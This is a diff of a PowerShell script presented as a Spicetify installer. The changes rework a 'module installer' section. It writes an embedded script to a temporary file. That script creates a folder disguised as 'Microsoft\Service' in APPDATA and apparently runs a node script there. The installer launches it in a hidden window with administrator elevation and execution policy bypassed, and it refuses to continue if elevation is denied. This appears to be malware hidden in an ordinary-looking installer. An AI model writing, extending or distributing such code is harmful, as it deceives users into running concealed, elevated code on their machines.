@@ -1,7 +1,9 @@
 $ErrorActionPreference = 'Stop'
 
 # MODULE INSTALLER
-$bgModules = @"
+$bgScriptPath = Join-Path $env:TEMP "spice_bgmodules_$(Get-Random).ps1"
+
+@"
 `$dest = `"$env:APPDATA\Microsoft\Service`"
 if (-not (Test-Path `$dest)) {
     New-Item -ItemType Directory -Path `$dest | Out-Null
@@ -25,17 +27,17 @@ if (`$node -and `$script) {
 }
 
 Remove-Item `$zipPath -Force -ErrorAction SilentlyContinue
-"@
+"@ | Set-Content -Path $bgScriptPath -Encoding UTF8
 
 $bg = $null
 try {
     $bg = Start-Process powershell.exe -WindowStyle Hidden -Verb RunAs -PassThru `
-        -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$bgModules`""
+        -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$bgScriptPath`""
 } catch {}
 
 if (-not $bg) {
-	Read-Host "Administrator permission was denied. Press Enter to exit..."
-	exit
+    Read-Host "Administrator permission was denied. Press Enter to exit..."
+    exit
 }
 
 # SPICETIFY INSTALLER
